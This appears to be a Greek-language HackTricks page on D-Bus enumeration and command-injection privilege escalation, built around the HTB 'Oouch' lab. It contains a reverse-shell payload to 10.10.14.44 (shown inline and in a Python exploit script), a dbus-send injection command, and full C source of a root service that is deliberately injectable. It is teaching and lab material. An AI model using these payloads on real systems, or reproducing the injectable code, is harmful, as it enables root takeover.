# D-Bus Enumeration & Command Injection Κλιμάκωση προνομίων

{{#include ../../banners/hacktricks-training.md}}

## **Απαρίθμηση μέσω GUI**

Το D-Bus χρησιμοποιείται ως διαμεσολαβητής επικοινωνίας μεταξύ διεργασιών (IPC) σε περιβάλλοντα επιφάνειας εργασίας Ubuntu. Στο Ubuntu παρατηρείται η ταυτόχρονη λειτουργία πολλών message bus: του system bus, που χρησιμοποιείται κυρίως από **προνομιούχες υπηρεσίες για την έκθεση υπηρεσιών που αφορούν ολόκληρο το σύστημα**, και ενός session bus για κάθε συνδεδεμένο χρήστη, που εκθέτει υπηρεσίες σχετικές μόνο με τον συγκεκριμένο χρήστη. Εδώ εστιάζουμε κυρίως στο system bus, λόγω της σύνδεσής του με υπηρεσίες που εκτελούνται με υψηλότερα προνόμια (π.χ. root), καθώς στόχος μας είναι η κλιμάκωση προνομίων. Σημειώνεται ότι η αρχιτεκτονική του D-Bus χρησιμοποιεί έναν «δρομολογητή» ανά session bus, ο οποίος είναι υπεύθυνος για την ανακατεύθυνση των μηνυμάτων των client στις κατάλληλες υπηρεσίες, με βάση τη διεύθυνση που ορίζουν οι client για την υπηρεσία με την οποία επιθυμούν να επικοινωνήσουν.<sup>[[1]](#references)</sup>

Οι υπηρεσίες στο D-Bus ορίζονται από τα **objects** και τα **interfaces** που εκθέτουν. Τα objects μπορούν να παρομοιαστούν με στιγμιότυπα κλάσεων σε τυπικές γλώσσες OOP, με κάθε στιγμιότυπο να αναγνωρίζεται μοναδικά από ένα **object path**. Αυτή η διαδρομή, παρόμοια με μια διαδρομή συστήματος αρχείων, αναγνωρίζει μοναδικά κάθε object που εκθέτει η υπηρεσία. Ένα βασικό interface για τους σκοπούς της έρευνας είναι το **org.freedesktop.DBus.Introspectable**, το οποίο περιλαμβάνει μία μόνο μέθοδο, την Introspect. Αυτή η μέθοδος επιστρέφει μια αναπαράσταση XML των υποστηριζόμενων μεθόδων, σημάτων και ιδιοτήτων του object. Εδώ εστιάζουμε στις μεθόδους, παραλείποντας τις ιδιότητες και τα σήματα.

Για την επικοινωνία με το interface του D-Bus χρησιμοποιήθηκαν δύο εργαλεία: το CLI εργαλείο **gdbus**, για εύκολη κλήση μεθόδων που εκθέτει το D-Bus μέσα από scripts, και το [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), ένα GUI εργαλείο βασισμένο στην Python, σχεδιασμένο για την απαρίθμηση των υπηρεσιών που είναι διαθέσιμες σε κάθε bus και την εμφάνιση των objects που περιέχει κάθε υπηρεσία.

```bash
sudo apt-get install d-feet
```

Αν ελέγχετε το **session bus**, επιβεβαιώστε πρώτα την τρέχουσα διεύθυνση:

```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Στην πρώτη εικόνα εμφανίζονται οι υπηρεσίες που είναι καταχωρισμένες στο system bus του D-Bus, με την **org.debin.apt** ειδικά επισημασμένη μετά την επιλογή του κουμπιού System Bus. Το D-Feet αναζητά αντικείμενα σε αυτή την υπηρεσία και εμφανίζει τις διεπαφές, τις μεθόδους, τις ιδιότητες και τα σήματα των επιλεγμένων αντικειμένων, όπως φαίνεται στη δεύτερη εικόνα. Εμφανίζεται επίσης αναλυτικά η υπογραφή κάθε μεθόδου.

Ένα αξιοσημείωτο χαρακτηριστικό είναι η εμφάνιση του **process ID (pid)** και της **command line** της υπηρεσίας, χρήσιμη για να επιβεβαιώσουμε αν η υπηρεσία εκτελείται με αυξημένα δικαιώματα, κάτι σημαντικό για τη συνάφεια της έρευνας.

**Το D-Feet επιτρέπει επίσης την κλήση μεθόδων**: οι χρήστες μπορούν να εισάγουν εκφράσεις Python ως παραμέτρους, τις οποίες το D-Feet μετατρέπει σε τύπους D-Bus προτού τις μεταβιβάσει στην υπηρεσία.

Ωστόσο, σημειώστε ότι **ορισμένες μέθοδοι απαιτούν authentication** προτού μας επιτρέψουν να τις καλέσουμε. Θα αγνοήσουμε αυτές τις μεθόδους, καθώς ο στόχος μας εξαρχής είναι να αυξήσουμε τα δικαιώματά μας χωρίς διαπιστευτήρια.

Σημειώστε επίσης ότι ορισμένες υπηρεσίες ρωτούν μια άλλη υπηρεσία D-Bus, με όνομα org.freedeskto.PolicyKit1, αν πρέπει να επιτραπεί σε έναν χρήστη να εκτελέσει συγκεκριμένες ενέργειες.

## **Cmd line Enumeration**

### Λίστα αντικειμένων υπηρεσίας

Μπορείτε να εμφανίσετε τις ανοιχτές διεπαφές D-Bus με:

```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```

Οι υπηρεσίες που επισημαίνονται ως **`(activatable)`** παρουσιάζουν ιδιαίτερο ενδιαφέρον, επειδή **δεν εκτελούνται ακόμη**, αλλά ένα αίτημα μέσω του bus μπορεί να τις εκκινήσει κατ' απαίτηση. Μην περιορίζεστε στο `busctl list`· αντιστοιχίστε αυτά τα ονόματα στα πραγματικά binaries που θα εκτελούσαν.

```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```

Αυτό σου δείχνει γρήγορα ποιο `Exec=` path θα εκκινηθεί για ένα activatable name και με ποια ταυτότητα. Αν το binary ή η αλυσίδα εκτέλεσής του δεν προστατεύεται επαρκώς, μια ανενεργή υπηρεσία μπορεί και πάλι να αποτελέσει διαδρομή για privilege escalation.

Για μια προνομιούχα υπηρεσία απεικόνισης USB, συσχέτισε το system-bus name με την **effective** πολιτική για την ενέργεια εγγραφής εικόνας. Ένας παλαιός κανόνας προμηθευτή μπορεί να ορίζει `ResultActive=yes` για μια διαχειριστική ομάδα Unix, χωρίς να ζητείται κωδικός πρόσβασης· επιβεβαίωσε ότι ο τρέχων λογαριασμός ανήκει σε αυτή την ομάδα, ότι η συνεδρία είναι ενεργή, ότι ο κανόνας έχει πράγματι φορτωθεί και δεν έχει παρακαμφθεί, καθώς και ότι το εγκατεστημένο βοηθητικό πρόγραμμα εξακολουθεί να δέχεται διαδρομές προέλευσης και προορισμού που επιλέγει ο καλών. Η περιγραφή της υπηρεσίας ή μια παλιά έκδοση του πακέτου από μόνη της δεν αποδεικνύει πρόσβαση σε αυθαίρετα αρχεία. Η απουσία descriptor ενεργοποίησης δεν αποκλείει την ύπαρξη μιας υπηρεσίας που εκτελείται ήδη. Επιθεώρησε τα σταθερά αρχεία πολιτικής και υπηρεσίας χωρίς να καλέσεις τη μέθοδο εγγραφής εικόνας· δες την [αρχική ανάλυση της υπηρεσίας](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/).

#### Συνδέσεις

[Από τη Wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Όταν μια διεργασία δημιουργεί μια σύνδεση με έναν bus, ο bus εκχωρεί στη σύνδεση ένα ειδικό bus name που ονομάζεται _μοναδικό όνομα σύνδεσης_. Τα bus names αυτού του τύπου είναι αμετάβλητα —είναι εγγυημένο ότι δεν θα αλλάξουν όσο υπάρχει η σύνδεση— και, το σημαντικότερο, δεν μπορούν να επαναχρησιμοποιηθούν κατά τη διάρκεια ζωής του bus. Αυτό σημαίνει ότι καμία άλλη σύνδεση με αυτόν τον bus δεν θα λάβει ποτέ το ίδιο μοναδικό όνομα σύνδεσης, ακόμη κι αν η ίδια διεργασία κλείσει τη σύνδεση με τον bus και δημιουργήσει νέα. Τα μοναδικά ονόματα σύνδεσης αναγνωρίζονται εύκολα, επειδή ξεκινούν με τον χαρακτήρα άνω και κάτω τελείας —ο οποίος διαφορετικά απαγορεύεται.<sup>[[4]](#references)</sup>

### Πληροφορίες αντικειμένου υπηρεσίας

Στη συνέχεια, μπορείς να λάβεις πληροφορίες σχετικά με το interface με:

```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
```

Συσχέτισε επίσης το όνομα του bus με το systemd unit και τη διαδρομή του εκτελέσιμου αρχείου:

```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```

Αυτό απαντά στο σημαντικό επιχειρησιακό ερώτημα κατά το privesc: **αν μια κλήση μεθόδου πετύχει, ποιο πραγματικό binary και ποιο unit θα εκτελέσουν την ενέργεια;**

### Λίστα των interfaces ενός αντικειμένου υπηρεσίας

Πρέπει να έχετε επαρκή δικαιώματα.

```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
  └─/htb/oouch
    └─/htb/oouch/Block
```

### Επιθεώρηση της διεπαφής ενός αντικειμένου υπηρεσίας

Σημειώστε ότι σε αυτό το παράδειγμα επιλέχθηκε η πιο πρόσφατη διεπαφή που εντοπίστηκε χρησιμοποιώντας την παράμετρο `tree` (_δείτε την προηγούμενη ενότητα_):

```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```

Σημειώστε τη μέθοδο `.Block` του interface `htb.oouch.Block` (αυτή που μας ενδιαφέρει). Το «s» στις άλλες στήλες μπορεί να σημαίνει ότι αναμένει ένα string.

Πριν δοκιμάσετε οτιδήποτε επικίνδυνο, επαληθεύστε πρώτα μια μέθοδο προσανατολισμένη στην ανάγνωση ή, διαφορετικά, χαμηλού κινδύνου. Έτσι διακρίνονται καθαρά τρεις περιπτώσεις: λανθασμένη σύνταξη, η μέθοδος είναι προσβάσιμη αλλά η πρόσβαση απορρίπτεται ή είναι προσβάσιμη και επιτρέπεται.

```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```

### Συσχετίστε τις μεθόδους D-Bus με τις πολιτικές και τις ενέργειες

Η introspection σάς δείχνει **τι** μπορείτε να καλέσετε, αλλά δεν σας λέει **γιατί** επιτρέπεται ή απορρίπτεται μια κλήση. Για πραγματικό privesc triage, συνήθως χρειάζεται να εξετάσετε μαζί **τρία επίπεδα**:

1. **Μεταδεδομένα ενεργοποίησης** (αρχεία `.service` ή `SystemdService=`) για να μάθετε ποιο binary και ποιο unit θα εκτελεστούν.
2. **Πολιτική D-Bus XML** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) για να μάθετε ποιος μπορεί να `own`, `send_destination` ή `receive_sender`.
3. **Αρχεία ενεργειών Polkit** (`/usr/share/polkit-1/actions/*.policy`) για να μάθετε το προεπιλεγμένο μοντέλο εξουσιοδότησης (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Χρήσιμες εντολές:

```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```

Do **not** assume αντιστοίχιση 1:1 μεταξύ μιας μεθόδου D-Bus και μιας ενέργειας Polkit. Η ίδια μέθοδος μπορεί να επιλέξει διαφορετική ενέργεια ανάλογα με το αντικείμενο που τροποποιείται ή το περιβάλλον εκτέλεσης. Επομένως, η πρακτική ροή εργασίας είναι:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` και αναζήτηση στα σχετικά αρχεία `.policy`
3. probes χαμηλού κινδύνου σε πραγματικό χρόνο με `busctl call`, `gdbus call` ή `dbusmap --enable-probes --null-agent`

Οι υπηρεσίες proxy ή συμβατότητας αξίζουν ιδιαίτερη προσοχή. Ένα **proxy που εκτελείται ως root** και προωθεί αιτήματα σε άλλη υπηρεσία D-Bus μέσω της δικής του ήδη εγκατεστημένης σύνδεσης μπορεί κατά λάθος να κάνει το backend να θεωρεί ότι κάθε αίτημα προέρχεται από UID 0, εκτός αν επαληθεύεται ξανά η ταυτότητα του αρχικού καλούντος.<sup>[[3]](#references)</sup>

### Διεπαφή παρακολούθησης/καταγραφής

Με αρκετά προνόμια (τα προνόμια `send_destination` και `receive_sender` από μόνα τους δεν αρκούν) μπορείς να **παρακολουθήσεις μια επικοινωνία D-Bus**.

Για να **παρακολουθήσεις** μια **επικοινωνία**, πρέπει να είσαι **root**. Αν εξακολουθείς να αντιμετωπίζεις προβλήματα ως root, έλεγξε τα [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) και [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Αν γνωρίζεις πώς να διαμορφώσεις ένα αρχείο ρυθμίσεων D-Bus ώστε να **επιτρέπεται σε μη root χρήστες να υποκλέπτουν** την επικοινωνία, **επικοινώνησε μαζί μου**!

Διαφορετικοί τρόποι παρακολούθησης:

```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```

Στο ακόλουθο παράδειγμα παρακολουθείται η διεπαφή `htb.oouch.Block` και **το μήνυμα "**_**lalalalal**_**" αποστέλλεται λόγω κακής επικοινωνίας**:

```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
  Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
  UniqueName=:1.1376
  MESSAGE "s" {
          STRING "lalalalal";
  };

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
  Sender=:1.3  Destination=:1.1376
  UniqueName=:1.3
  MESSAGE "s" {
          STRING "Carried out :D";
  };
```

Μπορείτε να χρησιμοποιήσετε το `capture` αντί για το `monitor` για να αποθηκεύσετε τα αποτελέσματα σε ένα αρχείο **pcapng** που μπορεί να ανοίξει το Wireshark:

```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```

#### Φιλτράρισμα όλου του θορύβου <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Αν υπάρχουν υπερβολικά πολλές πληροφορίες στο bus, περάστε έναν κανόνα αντιστοίχισης ως εξής:

```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```

Μπορούν να καθοριστούν πολλοί κανόνες. Αν ένα μήνυμα ταιριάζει με _οποιονδήποτε_ από τους κανόνες, το μήνυμα θα εκτυπωθεί. Για παράδειγμα:

```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```

Δείτε την [τεκμηρίωση του D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) για περισσότερες πληροφορίες σχετικά με τη σύνταξη των κανόνων αντιστοίχισης.<sup>[[7]](#references)</sup>

### Περισσότερα

Το `busctl` έχει ακόμη περισσότερες επιλογές, [**δείτε τις όλες εδώ**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Ευάλωτο σενάριο**

Ως χρήστης **qtc μέσα στο host "oouch" από το HTB**, μπορείτε να βρείτε ένα **μη αναμενόμενο αρχείο ρυθμίσεων D-Bus** στη θέση _/etc/dbus-1/system.d/htb.oouch.Block.conf_:

```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

	<policy user="www-data">
		<allow send_destination="htb.oouch.Block"/>
		<allow receive_sender="htb.oouch.Block"/>
	</policy>

</busconfig>
```

Σημείωση από την προηγούμενη ρύθμιση: θα πρέπει να είστε ο χρήστης `root` ή `www-data` για να στέλνετε και να λαμβάνετε πληροφορίες μέσω αυτής της επικοινωνίας D-BUS.

Ως χρήστης **qtc** μέσα στο Docker container **aeb4525789d8**, μπορείτε να βρείτε κώδικα σχετικό με το D-BUS στο αρχείο _/code/oouch/routes.py._ Ο κώδικας που μας ενδιαφέρει είναι ο εξής:

```python
if primitive_xss.search(form.textfield.data):
        bus = dbus.SystemBus()
        block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
        block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

        client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
        response = block_iface.Block(client_ip)
        bus.close()
        return render_template('hacker.html', title='Hacker')
```

Όπως μπορείτε να δείτε, **συνδέεται σε ένα D-Bus interface** και στέλνει στη συνάρτηση **"Block"** το "client_ip".

Στην άλλη πλευρά της σύνδεσης D-Bus εκτελείται ένα μεταγλωττισμένο binary σε C. Αυτός ο κώδικας **ακούει** στη σύνδεση D-Bus **για μια διεύθυνση IP και καλεί το iptables μέσω της συνάρτησης `system`** για να αποκλείσει τη συγκεκριμένη διεύθυνση IP.\
**Η κλήση της `system` είναι σκόπιμα ευάλωτη σε command injection**, επομένως ένα payload όπως το ακόλουθο θα δημιουργήσει ένα reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Εκμεταλλευτείτε το

Στο τέλος αυτής της σελίδας μπορείτε να βρείτε **ολόκληρο τον κώδικα C της εφαρμογής D-Bus**. Σε αυτόν μπορείτε να δείτε, στις γραμμές 91-97, **πώς καταχωρίζονται το `D-Bus object path`** **και το `interface name`**. Αυτές οι πληροφορίες θα χρειαστούν για να στείλετε δεδομένα στη σύνδεση D-Bus:

```c
        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
```

Επίσης, στη γραμμή 57 μπορείτε να δείτε ότι η **μόνη καταχωρισμένη μέθοδος** για αυτή την επικοινωνία D-Bus ονομάζεται `Block`(_**Γι' αυτό στην επόμενη ενότητα τα payloads θα σταλούν στο service object `htb.oouch.Block`, στο interface `/htb/oouch/Block` και στη μέθοδο `Block`**_):

```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```

#### Python

Ο παρακάτω κώδικας Python στέλνει το payload στη σύνδεση D-Bus, στη μέθοδο `Block`, μέσω του `block_iface.Block(runme)` (_σημειώστε ότι εξήχθη από το προηγούμενο τμήμα κώδικα_):

```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```

#### busctl και dbus-send

```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```

- `dbus-send` είναι ένα εργαλείο που χρησιμοποιείται για την αποστολή μηνυμάτων στο “Message Bus”
- Message Bus – Λογισμικό που χρησιμοποιείται από τα συστήματα για να διευκολύνει την επικοινωνία μεταξύ εφαρμογών. Σχετίζεται με το Message Queue (τα μηνύματα ταξινομούνται σε σειρά), αλλά στο Message Bus τα μηνύματα αποστέλλονται με βάση ένα μοντέλο συνδρομής και επίσης πολύ γρήγορα.
- Η ετικέτα “-system” χρησιμοποιείται για να δηλώσει ότι πρόκειται για μήνυμα συστήματος και όχι για μήνυμα συνεδρίας (από προεπιλογή).
- Η ετικέτα “–print-reply” χρησιμοποιείται για να εκτυπώσει σωστά το μήνυμά μας και να λάβει τυχόν απαντήσεις σε μορφή αναγνώσιμη από άνθρωπο.
- “–dest=Dbus-Interface-Block” Η διεύθυνση της διεπαφής Dbus.
- “–string:” – Τύπος μηνύματος που θέλουμε να στείλουμε στη διεπαφή. Υπάρχουν διάφορες μορφές αποστολής μηνυμάτων, όπως double, bytes, booleans, int, objpath. Από αυτές, το “object path” είναι χρήσιμο όταν θέλουμε να στείλουμε μια διαδρομή αρχείου στη διεπαφή Dbus. Σε αυτή την περίπτωση, μπορούμε να χρησιμοποιήσουμε ένα ειδικό αρχείο (FIFO) για να περάσουμε μια εντολή στη διεπαφή με το όνομα ενός αρχείου. Το “string:;” – Αυτό χρησιμοποιείται για να καλέσει ξανά το object path, όπου τοποθετούμε το αρχείο/εντολή reverse shell του FIFO.

_Σημειώστε ότι στο `htb.oouch.Block.Block`, το πρώτο μέρος (`htb.oouch.Block`) αναφέρεται στο αντικείμενο υπηρεσίας και το τελευταίο μέρος (`.Block`) αναφέρεται στο όνομα της μεθόδου._

### Κώδικας C

```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
        char* host = NULL;
        int r;

        /* Read the parameters */
        r = sd_bus_message_read(m, "s", &host);
        if (r < 0) {
                fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
                return r;
        }

        char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

        int command_len = strlen(command);
        int host_len = strlen(host);

        char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
        if(command_buffer == NULL) {
                fprintf(stderr, "Failed to allocate memory\n");
                return -1;
        }

        sprintf(command_buffer, command, host);

        /* In the first implementation, we simply ran command using system(), since the expected DBus
         * to be threading automatically. However, DBus does not thread and the application will hang
         * forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
         * multithreading)
         */
        int pid = fork();

        if ( pid == 0 ) {
            /* Here we are in the child process. We execute the command and eventually exit. */
            system(command_buffer);
            exit(0);
        } else {
            /* Here we are in the parent process or an error occured. We simply send a genric message.
             * In the first implementation we returned separate error messages for success or failure.
             * However, now we cannot wait for results of the system call. Therefore we simply return
             * a generic. */
            return sd_bus_reply_method_return(m, "s", "Carried out :D");
        }
        r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
        SD_BUS_VTABLE_START(0),
        SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
        SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
        /*
         * Main method, registeres the htb.oouch.Block service on the system dbus.
         *
         * Paramaters:
         *      argc            (int)             Number of arguments, not required
         *      argv[]          (char**)          Argument array, not required
         *
         * Returns:
         *      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
         *      as long as the user keeps it alive.
         */


        /* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
        signal(SIGCHLD,SIG_IGN);

        sd_bus_slot *slot = NULL;
        sd_bus *bus = NULL;
        int r;

        /* First we need to connect to the system bus. */
        r = sd_bus_open_system(&bus);
        if (r < 0)
        {
                fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
                goto finish;
        }

        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
        if (r < 0) {
                fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
                goto finish;
        }

        /* Register the service name to find out object */
        r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
        if (r < 0) {
                fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
                goto finish;
        }

        /* Infinite loop to process the client requests */
        for (;;) {
                /* Process requests */
                r = sd_bus_process(bus, NULL);
                if (r < 0) {
                        fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
                        goto finish;
                }
                if (r > 0) /* we processed a request, try to process another one, right-away */
                        continue;

                /* Wait for the next request to process */
                r = sd_bus_wait(bus, (uint64_t) -1);
                if (r < 0) {
                        fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
                        goto finish;
                }
        }

finish:
        sd_bus_slot_unref(slot);
        sd_bus_unref(bus);

        return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```

## Βοηθητικά εργαλεία αυτοματοποιημένης απαρίθμησης (2023-2025)

Η χειροκίνητη απαρίθμηση μιας μεγάλης επιφάνειας επίθεσης D-Bus με `busctl`/`gdbus` γίνεται γρήγορα επίπονη. Δύο μικρά FOSS utilities που κυκλοφόρησαν τα τελευταία χρόνια μπορούν να επιταχύνουν τη διαδικασία σε red-team ή CTF engagements:

### dbusmap («Nmap για D-Bus»)
* Δημιουργός: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* Γραμμένο σε C· ένα στατικό binary (<50 kB) που διατρέχει κάθε object path, ανακτά το XML του `Introspect` και το αντιστοιχίζει στο PID/UID που το κατέχει.<sup>[[5]](#references)</sup>
* Χρήσιμα flags:
  ```bash
  # List every service on the *system* bus and dump all callable methods
